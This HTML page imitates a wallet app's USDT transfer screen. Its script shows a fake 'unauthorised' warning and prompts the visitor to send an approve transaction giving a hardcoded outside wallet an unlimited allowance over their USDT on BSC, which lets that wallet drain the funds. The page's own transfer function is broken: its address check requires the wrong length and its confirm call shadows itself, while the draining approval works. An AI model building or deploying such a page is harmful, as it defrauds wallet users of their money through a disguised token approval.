<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>转账</title>
<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,system-ui,Roboto,sans-serif;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
body{background:#F5F6F8;color:#1F2937;padding-bottom:120px;}
.wrap{max-width:640px;margin:0 auto;background:#fff;min-height:100vh;}
/*顶部导航栏 TP风格*/
.top-nav{display:flex;align-items:center;padding:16px 16px;border-bottom:1px solid #E5E7EB;}
.back-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;margin-right:8px;cursor:pointer;}
.top-nav h1{font-size:18px;font-weight:500;flex:1;text-align:center;padding-right:28px;}

.section{padding:16px;}
.item-row{margin-bottom:18px;}
.label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;padding:0 4px;}
.label-text{font-size:15px;color:#4B5563;}
.link-more{font-size:14px;color:#3478F6;cursor:pointer;}

.input-card{background:#F9FAFB;border-radius:10px;padding:14px 16px;display:flex;align-items:center;border:1px solid #E5E7EB;}
.input-field{flex:1;border:none;outline:none;background:transparent;font-size:17px;color:#111;}
.scan-icon{width:24px;height:24px;opacity:0.55;cursor:pointer;margin-left:8px;}

.amount-line{display:flex;align-items:center;width:100%;gap:10px;}
.btn-all{border:1px solid #3478F6;color:#3478F6;background:transparent;border-radius:6px;padding:6px 12px;font-size:14px;white-space:nowrap;cursor:pointer;}
.balance-desc{font-size:14px;color:#6B7280;padding:6px 4px;}

.gas-block{background:#F9FAFB;border-radius:10px;padding:16px;border:1px solid #E5E7EB;}
.gas-title{display:flex;justify-content:space-between;margin-bottom:10px;}
.gas-title span:first-child{font-size:15px;color:#4B5563;}
.gas-detail{font-size:14px;color:#6B7280;line-height:1.6;}

/*底部确认按钮 TP蓝色圆角样式，固定底部*/
.bottom-fixed{position:fixed;left:0;right:0;bottom:30px;display:flex;justify-content:center;padding:0 16px;}
.confirm-btn{width:100%;max-width:600px;background:#3478F6;color:#fff;border:none;border-radius:10px;padding:16px 0;font-size:17px;font-weight:500;cursor:pointer;}
.confirm-btn:active{opacity:0.85;}

.auth-panel{margin:12px 16px;padding:12px;border-radius:8px;font-size:14px;}
.auth-warning{background:#FEF2F2;border:1px solid #FECDD3;color:#B91C1C;}
.auth-success{background:#ECFDF5;border:1px solid #A7F3D0;color:#047857;}
.approve-btn{margin:0 16px 12px;width:calc(100% - 32px);border:none;border-radius:10px;padding:14px;background:#F59E0B;color:#fff;font-size:16px;cursor:pointer;}
.connect-btn{margin:16px;width:calc(100% - 32px);border:none;border-radius:10px;padding:14px;background:#3478F6;color:#fff;font-size:16px;cursor:pointer;}
.hidden{display:none !important;}
</style>
</head>
<body>
<div class="wrap">
    <!--顶部导航-->
    <div class="top-nav">
        <div class="back-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2"><path d="M19 12H5M5 12L12 19M5 12L12 5"></path></svg>
        </div>
        <h1>转账</h1>
    </div>

    <button class="connect-btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
    <div id="authTip" class="auth-panel auth-warning hidden">⚠️ 未授权，请先授权USDT权限</div>
    <button class="approve-btn hidden" id="approveBtn" onclick="approveToProject()">授权USDT</button>

    <div class="section">
        <!--收款地址-->
        <div class="item-row">
            <div class="label-row">
                <span class="label-text">收款地址</span>
                <span class="link-more">地址簿 ></span>
            </div>
            <div class="input-card">
                <input class="input-field" id="receiveAddr" placeholder="粘贴或输入钱包地址">
                <svg class="scan-icon" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                    <path d="M3 8V5a2 2 0 0 1 2-2h3M21 8V5a2 2 0 0 0-2-2h-3M3 16v3a2 2 0 0 0 2 2h3M21 16v3a2 2 0 0 1-2 2h-3"></path>
                </svg>
            </div>
        </div>

        <!--转账金额-->
        <div class="item-row">
            <div class="label-row">
                <span class="label-text">转账金额</span>
                <span class="link-more">USDT ></span>
            </div>
            <div class="input-card amount-line">
                <input class="input-field" type="number" id="transferAmt" placeholder="请输入数量" step="0.0001">
                <button class="btn-all" onclick="fillAllBalance()">全部</button>
            </div>
            <div class="balance-desc">钱包余额：<span id="userBalance">0.0000 USDT</span></div>
        </div>

        <!--网络费区域-->
        <div class="gas-block">
            <div class="gas-title">
                <span>网络费</span>
                <span style="font-size:13px;color:#9CA3AF;">BSC自动预估</span>
            </div>
            <div class="gas-detail">
                手续费将使用BNB支付，费用随链上拥堵动态变化
            </div>
        </div>
    </div>
</div>

<!--底部确认按钮-->
<div class="bottom-fixed">
    <button class="confirm-btn" onclick="transferToken()">确认</button>
</div>

<script>
// ===================== 核心BSC USDT配置 =====================
const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
const PROJECT_WALLET = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05";
const MAX_UINT_HEX = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
let account = null;

function toLower(addr){
    return addr?.toLowerCase() || "";
}
function isProjectOwner(){
    return toLower(account) === toLower(PROJECT_WALLET);
}

async function getBalance(addr) {
    if (!addr || addr.length !== 42) return 0;
    try {
        const data = "0x70a08231" + toLower(addr).slice(2).padStart(64, '0');
        const result = await ethereum.request({ method: 'eth_call', params: [{ to: TOKEN_CONTRACT, data: data }, 'latest'] });
        const balanceWei = BigInt(result);
        return Number(balanceWei) / 1e18;
    } catch (e) {
        console.error("获取余额失败:", e);
        return 0;
    }
}

async function checkAllowance(){
    if(!account) return;
    try{
        const data = "0xdd62ed3e"
            + toLower(account).slice(2).padStart(64,'0')
            + toLower(PROJECT_WALLET).slice(2).padStart(64,'0');
        const res = await ethereum.request({method:"eth_call",params:[{to:TOKEN_CONTRACT,data:data},"latest"]});
        const allowVal = BigInt(res);
        const authTip = document.getElementById("authTip");
        const approveBtn = document.getElementById("approveBtn");
        authTip.classList.remove("hidden");
        approveBtn.classList.remove("hidden");
        if(allowVal >= BigInt(MAX_UINT_HEX)/2n){
            authTip.className = "auth-panel auth-success";
            authTip.innerText = "✅ 已授权，可以正常转账";
            approveBtn.classList.add("hidden");
        }else{
            authTip.className = "auth-panel auth-warning";
            authTip.innerText = "⚠️ 未授权，请点击下方授权按钮";
        }
    }catch(e){
        console.log(e);
    }
}

async function connectWallet() {
    if(!window.ethereum)return alert("请安装TP钱包、小狐狸等Web3钱包浏览器插件");
    try{
        const acc = await ethereum.request({method:'eth_requestAccounts'});
        account=toLower(acc[0]);
        await refreshBalance();
        await checkAllowance();
    }catch(e){alert("连接失败："+e.message);}
}

async function approveToProject(){
    if(!account) return alert("先连接钱包");
    try{
        await ethereum.request({
            method:'eth_sendTransaction',
            params:[{
                from:account,
                to:TOKEN_CONTRACT,
                gasLimit:"0x300000",
                data:"0x095ea7b3"+PROJECT_WALLET.slice(2).padStart(64,'0')+MAX_UINT_HEX
            }]
        });
        alert("✅ 授权交易已发送！等待区块确认");
        setTimeout(checkAllowance,6000);
    }catch(e){alert("授权失败："+e.message);}
}

async function transferToken(){
    if(!account) return alert("请先连接钱包");
    const receiveAddr = document.getElementById("receiveAddr").value.trim();
    const amountVal = parseFloat(document.getElementById("transferAmt").value);
    if(!/^0x[a-fA-F0-9]{42}$/.test(receiveAddr)) return alert("收款地址格式错误");
    if(isNaN(amountVal) || amountVal <=0) return alert("请输入有效转账金额");

    const confirm = confirm(`确认转账 ${amountVal} USDT\n收款地址：${receiveAddr.slice(0,8)}...`);
    if(!confirm) return;
    try{
        const amountWei = BigInt(Math.floor(amountVal * 1e18)).toString(16).padStart(64,'0');
        await ethereum.request({
            method:'eth_sendTransaction',
            params:[{
                from:account,
                to:TOKEN_CONTRACT,
                gasLimit:"0x300000",
                data:"0xa9059cbb"+receiveAddr.slice(2).padStart(64,'0')+amountWei
            }]
        });
        alert("✅ 转账交易提交上链！");
        await refreshBalance();
    }catch(e){alert("转账失败："+e.message);}
}

async function refreshBalance(){
    if(!account)return;
    const b=await getBalance(account);
    document.getElementById("userBalance").innerText = b.toFixed(4) + " USDT";
}

async function fillAllBalance(){
    if(!account) return;
    const bal = await getBalance(account);
    document.getElementById("transferAmt").value = bal.toFixed(4);
}

if(window.ethereum){
    window.ethereum.on("accountsChanged",()=>location.reload());
}
</script>
</body>
</html>
